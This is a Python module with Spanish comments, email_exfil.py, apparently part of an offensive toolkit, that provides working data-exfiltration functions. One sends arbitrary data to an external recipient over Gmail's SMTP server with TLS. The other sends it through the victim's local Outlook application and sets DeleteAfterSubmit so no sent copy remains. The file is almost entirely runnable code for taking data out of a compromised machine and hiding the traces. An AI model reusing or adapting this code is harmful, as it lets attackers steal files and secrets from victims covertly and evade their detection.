"""
email_exfil.py - Exfiltración por correo electrónico (SMTP / Outlook)
======================================================================
Proporciona dos métodos de exfiltración de datos por email:
  - plain_email(): envío directo por SMTP con TLS (gmail u otro servidor).
  - outlook():     envío a través de la aplicación Outlook local (COM).

NOTA: Este módulo requiere Windows para la función outlook() (win32com).
      plain_email() funciona en cualquier plataforma con acceso SMTP.

ERRORES CORREGIDOS:
    1. Datos personales (email, contraseña) reemplazados por variables
       de entorno con indicación clara de cómo configurarlas.

REQUISITOS:
    pip install pywin32   # solo necesario para outlook()

EJEMPLOS DE EJECUCIÓN:
    # Configurar variables de entorno antes de ejecutar:
    SMTP_ACCT=tu_email@gmail.com SMTP_PWD=tu_contraseña python email_exfil.py

    # O importar las funciones en exfil.py:
    from email_exfil import plain_email, outlook
"""

import os
import smtplib
import time

import win32com.client  # Solo disponible en Windows

# -------------------------------------------------------------------
# Configuración SMTP — leer desde variables de entorno
# -------------------------------------------------------------------
smtp_server = 'smtp.gmail.com'
smtp_port   = 587
smtp_acct   = os.environ.get('SMTP_ACCT', 'remitente@example.com')   # FIX: email personal eliminado
smtp_pwd    = os.environ.get('SMTP_PWD',  '')                         # FIX: contraseña eliminada
tgt_accts   = [os.environ.get('SMTP_TGT', 'destinatario@example.com')]  # FIX: email destinatario eliminado


def plain_email(subject, contents):
    """
    Envía `contents` como cuerpo de un email SMTP con TLS.

    Args:
        subject  (str):   Asunto del correo.
        contents (bytes): Cuerpo del mensaje (se decodifica a str).
    """
    message  = f'Subject: {subject}\nFrom: {smtp_acct}\n'
    message += f'To: {tgt_accts}\n\n{contents.decode()}'

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_pwd)
    server.sendmail(smtp_acct, tgt_accts, message)
    time.sleep(1)
    server.quit()


def outlook(subject, contents):
    """
    Envía `contents` a través de la aplicación Microsoft Outlook local
    (requiere Windows y Outlook instalado).

    Args:
        subject  (str):   Asunto del correo.
        contents (bytes): Cuerpo del mensaje (se decodifica a str).
    """
    outlook_app = win32com.client.Dispatch('outlook.application')
    message = outlook_app.CreateItem(0)
    message.DeleteAfterSubmit = True
    message.Subject = subject
    message.Body    = contents.decode()
    message.To      = tgt_accts[0]
    message.Send()


if __name__ == '__main__':
    plain_email('Test Subject', b'ataque al amanecer.')
